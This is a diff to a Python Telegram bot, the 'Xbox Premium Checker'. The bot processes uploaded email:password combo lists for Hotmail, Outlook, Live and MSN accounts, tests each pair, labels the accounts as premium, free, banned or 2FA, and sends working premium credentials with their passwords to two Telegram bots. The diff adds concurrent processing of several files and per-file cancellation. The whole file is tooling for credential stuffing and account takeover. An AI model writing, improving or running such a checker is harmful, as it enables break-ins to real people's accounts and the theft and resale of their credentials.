@@ -433,21 +433,29 @@ ALLOWED_DOMAINS = [
     'msn.com', 'passport.com'
 ]
 
+# Configuration
+MAX_CONCURRENT_FILES = 5  # Number of files to process simultaneously
+BATCH_SIZE = 15  # Accounts per batch update
+
 # Global variables
 task_queue = queue.Queue()
-processing_active = False
-current_task = None
-cancel_flag = False
-processing_lock = threading.Lock()
+active_tasks = {}  # task_id -> task object
+active_tasks_lock = threading.Lock()
+cancel_flags = {}  # task_id -> cancel_flag
+task_counter = 0
+task_counter_lock = threading.Lock()
 loop = None
 
 class ScanTask:
     def __init__(self, file_path, original_name, file_id, chat_id):
+        self.task_id = None
         self.file_path = file_path
         self.original_name = original_name
         self.file_id = file_id
         self.chat_id = chat_id
         self.created_at = datetime.now()
+        self.status = "pending"
+        self.stats = None
 
 def validate_microsoft_domain(email):
     try:
@@ -487,10 +495,10 @@ def validate_and_filter_file(file_path):
     except Exception:
         return None, 0, 0, []
 
-def run_checker_on_file(file_path, batch_callback, final_callback, cancel_check_callback):
+def run_checker_on_file(task, batch_callback, final_callback):
     """Run REAL XboxChecker on each account with batched results"""
     try:
-        with open(file_path, 'r', encoding='utf-8') as f:
+        with open(task.file_path, 'r', encoding='utf-8') as f:
             lines = [l.strip() for l in f.readlines() if l.strip() and ':' in l]
         
         if not lines:
@@ -511,14 +519,11 @@ def run_checker_on_file(file_path, batch_callback, final_callback, cancel_check_
         }
         
         premium_results = []
-        free_results = []
-        bad_results = []
-        
         batch_buffer = []
-        BATCH_SIZE = 15  # Send update every 15 accounts
         
         for idx, line in enumerate(lines, 1):
-            if cancel_check_callback and cancel_check_callback():
+            # Check cancellation
+            if cancel_flags.get(task.task_id, False):
                 final_callback({"status": "cancelled", "stats": stats})
                 return
             
@@ -532,7 +537,6 @@ def run_checker_on_file(file_path, batch_callback, final_callback, cancel_check_
                 status = result['status']
                 data = result.get('data', {})
                 
-                # Collect result
                 result_entry = f"{email}:{password}"
                 
                 if status == "PREMIUM":
@@ -541,7 +545,7 @@ def run_checker_on_file(file_path, batch_callback, final_callback, cancel_check_
                     result_entry += f" ✅ PREMIUM | {data.get('premium_type', 'GAME PASS')} | {data.get('days_remaining', '0')} days"
                     batch_buffer.append(result_entry)
                     
-                    # Send immediate Telegram notification to BOTH bots
+                    # Send immediate Telegram notification
                     try:
                         sender = TelegramSender()
                         msg = sender.format_hit_message(email, password, data)
@@ -551,50 +555,43 @@ def run_checker_on_file(file_path, batch_callback, final_callback, cancel_check_
                         
                 elif status == "FREE":
                     stats["free"] += 1
-                    result_entry += f" 🆓 FREE ACCOUNT"
+                    result_entry += f" 🆓 FREE"
                     batch_buffer.append(result_entry)
-                    free_results.append((email, password, data))
                     
                 elif status == "EXPIRED":
                     stats["expired"] += 1
                     stats["bad"] += 1
                     result_entry += f" ⏰ EXPIRED"
                     batch_buffer.append(result_entry)
-                    bad_results.append(email)
                     
                 elif status == "BANNED":
                     stats["banned"] += 1
                     stats["bad"] += 1
                     result_entry += f" 🚫 BANNED"
                     batch_buffer.append(result_entry)
-                    bad_results.append(email)
                     
                 elif status == "2FACTOR":
                     stats["two_factor"] += 1
                     stats["bad"] += 1
-                    result_entry += f" 🔐 2FA REQUIRED"
+                    result_entry += f" 🔐 2FA"
                     batch_buffer.append(result_entry)
-                    bad_results.append(email)
                     
                 elif status == "TIMEOUT":
                     stats["timeout"] += 1
                     stats["bad"] += 1
                     result_entry += f" ⏱️ TIMEOUT"
                     batch_buffer.append(result_entry)
-                    bad_results.append(email)
                     
                 elif status == "ERROR":
                     stats["error"] += 1
                     stats["bad"] += 1
                     result_entry += f" ⚠️ ERROR"
                     batch_buffer.append(result_entry)
-                    bad_results.append(email)
                     
-                else:  # BAD
+                else:
                     stats["bad"] += 1
-                    result_entry += f" ❌ BAD CREDENTIALS"
+                    result_entry += f" ❌ BAD"
                     batch_buffer.append(result_entry)
-                    bad_results.append(email)
                 
                 stats["checked"] += 1
                 
@@ -609,7 +606,7 @@ def run_checker_on_file(file_path, batch_callback, final_callback, cancel_check_
                 stats["error"] += 1
                 stats["bad"] += 1
                 stats["checked"] += 1
-                batch_buffer.append(f"{line[:50]}... ⚠️ ERROR: {str(e)[:30]}")
+                batch_buffer.append(f"{line[:50]}... ERROR: {str(e)[:30]}")
                 if len(batch_buffer) >= BATCH_SIZE:
                     batch_callback(batch_buffer.copy(), stats)
                     batch_buffer.clear()
@@ -618,7 +615,6 @@ def run_checker_on_file(file_path, batch_callback, final_callback, cancel_check_
         if batch_buffer:
             batch_callback(batch_buffer.copy(), stats)
         
-        # Format premium text for final summary
         premium_text = "\n".join([f"{e}:{p} | {d.get('premium_type', 'UNKNOWN')} | {d.get('days_remaining', '0')} days" for e, p, d in premium_results])
         
         final_callback({"status": "success", "stats": stats, "premium_text": premium_text})
@@ -626,79 +622,116 @@ def run_checker_on_file(file_path, batch_callback, final_callback, cancel_check_
     except Exception as e:
         final_callback({"status": "error", "error": str(e), "traceback": traceback.format_exc()})
 
-def process_queue():
-    global processing_active, current_task, cancel_flag
-    
-    while True:
-        try:
-            if task_queue.empty():
-                with processing_lock:
-                    processing_active = False
-                    current_task = None
-                time.sleep(1)
-                continue
-            
-            with processing_lock:
-                current_task = task_queue.get()
-                processing_active = True
-                cancel_flag = False
-            
-            asyncio.run_coroutine_threadsafe(send_processing_start(current_task), loop)
-            
-            # Batch callback for intermediate updates
-            def batch_callback(batch_results, stats):
+def process_file_worker(task):
+    """Worker function to process a single file"""
+    try:
+        # Send start message
+        asyncio.run_coroutine_threadsafe(
+            send_processing_start_concurrent(task),
+            loop
+        )
+        
+        # Batch callback
+        def batch_callback(batch_results, stats):
+            asyncio.run_coroutine_threadsafe(
+                send_batch_update_concurrent(task, batch_results, stats),
+                loop
+            )
+        
+        # Final callback
+        def final_callback(result):
+            if result.get("status") == "success":
                 asyncio.run_coroutine_threadsafe(
-                    send_batch_update(current_task, batch_results, stats),
+                    send_final_results_concurrent(task, result["stats"], result["premium_text"]),
+                    loop
+                )
+            elif result.get("status") == "cancelled":
+                asyncio.run_coroutine_threadsafe(
+                    send_cancelled_message_concurrent(task),
+                    loop
+                )
+            else:
+                asyncio.run_coroutine_threadsafe(
+                    send_error_message_concurrent(task, result.get("error", "Unknown error")),
                     loop
                 )
             
-            # Final callback
-            def final_callback(result):
-                if result.get("status") == "success":
-                    asyncio.run_coroutine_threadsafe(
-                        send_final_results(current_task, result["stats"], result["premium_text"]),
-                        loop
-                    )
-                elif result.get("status") == "cancelled":
-                    asyncio.run_coroutine_threadsafe(
-                        send_cancelled_message(current_task),
-                        loop
-                    )
-                else:
-                    asyncio.run_coroutine_threadsafe(
-                        send_error_message(current_task, result.get("error", "Unknown error")),
-                        loop
-                    )
-            
-            def cancel_check():
-                return cancel_flag
-            
-            run_checker_on_file(current_task.file_path, batch_callback, final_callback, cancel_check)
-            
-            if current_task.file_path and os.path.exists(current_task.file_path):
+            # Cleanup
+            if task.file_path and os.path.exists(task.file_path):
                 try:
-                    shutil.rmtree(os.path.dirname(current_task.file_path))
+                    shutil.rmtree(os.path.dirname(task.file_path))
                 except:
                     pass
             
-            task_queue.task_done()
+            # Remove from active tasks
+            with active_tasks_lock:
+                if task.task_id in active_tasks:
+                    del active_tasks[task.task_id]
+                if task.task_id in cancel_flags:
+                    del cancel_flags[task.task_id]
+        
+        run_checker_on_file(task, batch_callback, final_callback)
+        
+    except Exception as e:
+        asyncio.run_coroutine_threadsafe(
+            send_error_message_concurrent(task, str(e)),
+            loop
+        )
+        with active_tasks_lock:
+            if task.task_id in active_tasks:
+                del active_tasks[task.task_id]
+            if task.task_id in cancel_flags:
+                del cancel_flags[task.task_id]
+
+def worker_manager():
+    """Manages worker threads for concurrent file processing"""
+    while True:
+        try:
+            # Check current active tasks
+            with active_tasks_lock:
+                current_active = len(active_tasks)
             
+            # If we have capacity, get new tasks
+            if current_active < MAX_CONCURRENT_FILES:
+                try:
+                    task = task_queue.get(timeout=1)
+                    
+                    # Assign task ID
+                    global task_counter
+                    with task_counter_lock:
+                        task_counter += 1
+                        task.task_id = task_counter
+                    
+                    # Register task
+                    with active_tasks_lock:
+                        active_tasks[task.task_id] = task
+                        cancel_flags[task.task_id] = False
+                    
+                    # Start worker thread for this task
+                    worker_thread = threading.Thread(target=process_file_worker, args=(task,), daemon=True)
+                    worker_thread.start()
+                    
+                except queue.Empty:
+                    time.sleep(0.5)
+            else:
+                time.sleep(0.5)
+                
         except Exception as e:
-            if current_task:
-                asyncio.run_coroutine_threadsafe(send_error_message(current_task, str(e)), loop)
-                task_queue.task_done()
+            print(f"Worker manager error: {e}")
             time.sleep(1)
 
-async def send_processing_start(task):
-    msg = f"🚀 **XBOX CHECKER STARTED**\n\n📄 `{task.original_name}`\n⏰ Started: {task.created_at.strftime('%H:%M:%S')}\n\n📊 Processing accounts... Results will appear in batches."
+# ============ ASYNC SEND FUNCTIONS ============
+
+async def send_processing_start_concurrent(task):
+    msg = f"🚀 **FILE {task.task_id} STARTED**\n\n📄 `{task.original_name}`\n⏰ Started: {task.created_at.strftime('%H:%M:%S')}\n⚡ Concurrent mode: {MAX_CONCURRENT_FILES} files at once"
     await app.bot.send_message(chat_id=CHAT_ID, text=msg, parse_mode=ParseMode.MARKDOWN)
 
-async def send_batch_update(task, batch_results, stats):
-    """Send batched results (multiple accounts at once)"""
-    progress = f"📊 **Progress:** {stats['checked']}/{stats['total']} accounts checked\n"
+async def send_batch_update_concurrent(task, batch_results, stats):
+    progress = f"📊 **File {task.task_id}:** {task.original_name[:30]}\n"
+    progress += f"📈 **Progress:** {stats['checked']}/{stats['total']} accounts\n"
     progress += f"✅ **Premium:** {stats['premium']} | 🆓 **Free:** {stats['free']} | ❌ **Bad:** {stats['bad']}\n\n"
     
-    results_text = "\n".join(batch_results[:25])  # Limit to 25 per message
+    results_text = "\n".join(batch_results[:25])
     if len(batch_results) > 25:
         results_text += f"\n... and {len(batch_results) - 25} more"
     
@@ -707,15 +740,14 @@ async def send_batch_update(task, batch_results, stats):
     try:
         await app.bot.send_message(chat_id=CHAT_ID, text=message, parse_mode=ParseMode.MARKDOWN)
     except:
-        # Fallback if message too long
         await app.bot.send_message(chat_id=CHAT_ID, text=progress, parse_mode=ParseMode.MARKDOWN)
 
-async def send_final_results(task, stats, premium_text):
+async def send_final_results_concurrent(task, stats, premium_text):
     receipt = (
-        f"✅ **SCAN COMPLETE**\n\n"
+        f"✅ **FILE {task.task_id} COMPLETE**\n\n"
         f"📄 **File:** `{task.original_name}`\n"
         f"⏱️ **Duration:** {(datetime.now() - task.created_at).total_seconds():.1f}s\n\n"
-        f"📊 **FINAL RESULTS**\n"
+        f"📊 **RESULTS**\n"
         f"━━━━━━━━━━━━━━━━━━━━\n"
         f"🔢 Total: `{stats['total']}`\n"
         f"✅ PREMIUM: `{stats['premium']}`\n"
@@ -731,19 +763,21 @@ async def send_final_results(task, stats, premium_text):
     if stats['premium'] > 0 and premium_text:
         await app.bot.send_message(
             chat_id=CHAT_ID,
-            text=f"🎮 **PREMIUM ACCOUNTS ({stats['premium']})**\n\n```\n{premium_text[:4000]}\n```",
+            text=f"🎮 **PREMIUM ACCOUNTS (File {task.task_id})**\n\n```\n{premium_text[:4000]}\n```",
             parse_mode=ParseMode.MARKDOWN
         )
     
-    remaining = task_queue.qsize()
-    if remaining > 0:
-        await app.bot.send_message(chat_id=CHAT_ID, text=f"📁 Next: {remaining} file(s) waiting...", parse_mode=ParseMode.MARKDOWN)
+    # Show active files
+    with active_tasks_lock:
+        active_count = len(active_tasks)
+    if active_count > 0:
+        await app.bot.send_message(chat_id=CHAT_ID, text=f"⚡ {active_count} file(s) still processing...", parse_mode=ParseMode.MARKDOWN)
 
-async def send_error_message(task, error):
-    await app.bot.send_message(chat_id=CHAT_ID, text=f"❌ **ERROR**\n\n📄 `{task.original_name}`\n`{error[:500]}`", parse_mode=ParseMode.MARKDOWN)
+async def send_error_message_concurrent(task, error):
+    await app.bot.send_message(chat_id=CHAT_ID, text=f"❌ **ERROR - File {task.task_id}**\n\n📄 `{task.original_name}`\n`{error[:500]}`", parse_mode=ParseMode.MARKDOWN)
 
-async def send_cancelled_message(task):
-    await app.bot.send_message(chat_id=CHAT_ID, text=f"🛑 **CANCELLED**\n\n📄 `{task.original_name}`", parse_mode=ParseMode.MARKDOWN)
+async def send_cancelled_message_concurrent(task):
+    await app.bot.send_message(chat_id=CHAT_ID, text=f"🛑 **CANCELLED - File {task.task_id}**\n\n📄 `{task.original_name}`", parse_mode=ParseMode.MARKDOWN)
 
 async def send_rejection_message(original_name, valid_count, invalid_count, invalid_examples):
     msg = f"❌ **FILE REJECTED**\n\n📄 `{original_name}`\n🔢 Valid Microsoft accounts: `{valid_count}`\n⚠️ Skipped: `{invalid_count}` non-Microsoft account(s)"
@@ -752,40 +786,69 @@ async def send_rejection_message(original_name, valid_count, invalid_count, inva
     msg += f"\n\n✅ Allowed domains:\nhotmail.com, outlook.com, live.com, msn.com"
     await app.bot.send_message(chat_id=CHAT_ID, text=msg, parse_mode=ParseMode.MARKDOWN)
 
+# ============ COMMAND HANDLERS ============
+
 async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     msg = (
         "🎮 **XBOX PREMIUM CHECKER BOT**\n\n"
-        "Send a `.txt` file with `email:password` format\n\n"
+        "Send `.txt` files with `email:password` format\n\n"
+        f"⚡ **CONCURRENT MODE:** {MAX_CONCURRENT_FILES} files at once!\n"
+        f"📦 **Batch Size:** {BATCH_SIZE} accounts per update\n\n"
         "**Allowed domains:**\n"
         "hotmail.com, outlook.com, live.com, msn.com\n\n"
         "**Commands:**\n"
         "/start - This message\n"
-        "/status - Queue status\n"
-        "/cancel - Stop current scan\n\n"
-        "📊 Results appear in batches (15 accounts per update)\n"
+        "/status - Queue & active files\n"
+        "/cancel [file_id] - Cancel specific file\n"
+        "/cancel all - Cancel all active scans\n\n"
         "🎯 Premium hits sent to BOTH Telegram bots instantly!"
     )
     await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN)
 
 async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    with processing_lock:
-        queue_size = task_queue.qsize()
-        is_processing = processing_active
+    queue_size = task_queue.qsize()
+    with active_tasks_lock:
+        active_count = len(active_tasks)
+        active_list = list(active_tasks.values())
     
-    if is_processing and current_task:
-        msg = f"📊 **Active:** `{current_task.original_name}`\n⏳ **Queue:** {queue_size} file(s)"
-    else:
-        msg = f"📊 **Idle**\n⏳ **Queue:** {queue_size} file(s)\n\nSend a .txt file to start."
+    msg = f"📊 **SYSTEM STATUS**\n\n"
+    msg += f"⚡ **Concurrent Limit:** {MAX_CONCURRENT_FILES}\n"
+    msg += f"🔄 **Active Files:** {active_count}/{MAX_CONCURRENT_FILES}\n"
+    msg += f"⏳ **Queue Size:** {queue_size} files\n\n"
+    
+    if active_list:
+        msg += "**Active Scans:**\n"
+        for task in active_list[:5]:
+            msg += f"  • File {task.task_id}: `{task.original_name}`\n"
+    
+    if queue_size > 0:
+        msg += f"\n📁 {queue_size} file(s) waiting in queue."
+    
     await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN)
 
 async def cancel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    global cancel_flag
-    with processing_lock:
-        if processing_active and current_task:
-            cancel_flag = True
-            await update.message.reply_text(f"🛑 Cancelling `{current_task.original_name}`...", parse_mode=ParseMode.MARKDOWN)
-        else:
-            await update.message.reply_text("No active scan to cancel.")
+    args = context.args
+    if not args:
+        await update.message.reply_text("Usage: /cancel [file_id] or /cancel all\n\nUse /status to see active file IDs.")
+        return
+    
+    if args[0].lower() == "all":
+        with active_tasks_lock:
+            for task_id in cancel_flags:
+                cancel_flags[task_id] = True
+        await update.message.reply_text(f"🛑 Cancelling all {len(cancel_flags)} active scans...")
+        return
+    
+    try:
+        task_id = int(args[0])
+        with active_tasks_lock:
+            if task_id in cancel_flags:
+                cancel_flags[task_id] = True
+                await update.message.reply_text(f"🛑 Cancelling File {task_id}...")
+            else:
+                await update.message.reply_text(f"File {task_id} not found or already completed.")
+    except ValueError:
+        await update.message.reply_text("Invalid file ID. Use /status to see active file IDs.")
 
 async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
     document = update.message.document
@@ -810,18 +873,21 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
     task_queue.put(task)
     queue_size = task_queue.qsize()
     
+    with active_tasks_lock:
+        current_active = len(active_tasks)
+    
     await update.message.reply_text(
-        f"✅ **File Accepted**\n\n📄 `{document.file_name}`\n🔢 Valid: `{valid_count}` accounts\n📊 Queue: `{queue_size}`\n\n🔄 Starting REAL Xbox validation...\n📦 Results will appear in batches every 15 accounts.\n🤖 Premium hits sent to BOTH Telegram bots!",
+        f"✅ **File Accepted**\n\n"
+        f"📄 `{document.file_name}`\n"
+        f"🔢 Valid: `{valid_count}` accounts\n"
+        f"⚡ **Active Files:** {current_active}/{MAX_CONCURRENT_FILES}\n"
+        f"⏳ **Queue Position:** {queue_size}\n\n"
+        f"🔄 Will start automatically when worker available...",
         parse_mode=ParseMode.MARKDOWN
     )
     
     if invalid_count > 0:
         await update.message.reply_text(f"⚠️ Skipped `{invalid_count}` non-Microsoft account(s)", parse_mode=ParseMode.MARKDOWN)
-    
-    with processing_lock:
-        if not processing_active:
-            thread = threading.Thread(target=process_queue, daemon=True)
-            thread.start()
 
 def main():
     global app, loop
@@ -833,12 +899,18 @@ def main():
     app.add_handler(CommandHandler("cancel", cancel_command))
     app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
     
-    print("🤖 Xbox Checker Bot Running (Dual Bot Mode)...")
-    print(f"✅ Premium hits will be sent to BOTH Telegram bots:")
-    print(f"   Bot 1: {TELEGRAM_BOT_TOKEN_1[:15]}...")
-    print(f"   Bot 2: {TELEGRAM_BOT_TOKEN_2[:15]}...")
-    print("Results will be sent in batches of 15 accounts")
+    # Start worker manager thread
+    manager_thread = threading.Thread(target=worker_manager, daemon=True)
+    manager_thread.start()
+    
+    print("=" * 50)
+    print("🤖 XBOX CHECKER BOT - CONCURRENT MODE")
+    print(f"⚡ Processing up to {MAX_CONCURRENT_FILES} files simultaneously!")
+    print(f"📦 Batch updates every {BATCH_SIZE} accounts")
+    print(f"✅ Premium hits sent to BOTH Telegram bots")
+    print("=" * 50)
     print("Waiting for .txt files...")
+    
     app.run_polling()
 
 if __name__ == "__main__":
